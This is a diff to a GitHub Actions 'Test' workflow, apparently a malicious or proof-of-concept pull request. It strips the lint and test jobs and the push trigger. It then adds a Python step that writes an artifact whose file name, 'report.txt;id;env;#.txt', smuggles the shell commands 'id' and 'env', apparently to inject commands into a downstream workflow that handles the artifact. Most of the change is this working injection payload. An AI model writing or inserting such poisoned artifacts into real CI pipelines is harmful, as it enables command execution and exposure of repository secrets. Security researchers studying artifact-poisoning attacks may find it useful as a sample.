@@ -1,23 +1,9 @@
 name: Test
 
-concurrency:
-  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
-  cancel-in-progress: true
-
 on:
   pull_request:
-  push:
-    branches:
-      - main
 
 jobs:
-  lint:
-    uses: bgd-labs/github-workflows/.github/workflows/foundry-lint-prettier.yml@main
-  test:
-    uses: bgd-labs/github-workflows/.github/workflows/foundry-test.yml@main
-    secrets:
-      ALCHEMY_API_KEY: ${{ secrets.ALCHEMY_API_KEY }}
-
   content:
     runs-on: ubuntu-latest
     steps:
@@ -25,7 +11,9 @@ jobs:
         run: |
           mkdir -p /tmp/content
           echo "${{ github.event.pull_request.number }}" > /tmp/content/pr_number.txt
-          echo "report from prepared Test workflow" > /tmp/content/report.txt
+          python3 - <<'PY'
+          open('/tmp/content/report.txt;id;env;#.txt','w').write('attacker report\n')
+          PY
       - name: upload artifact
         uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
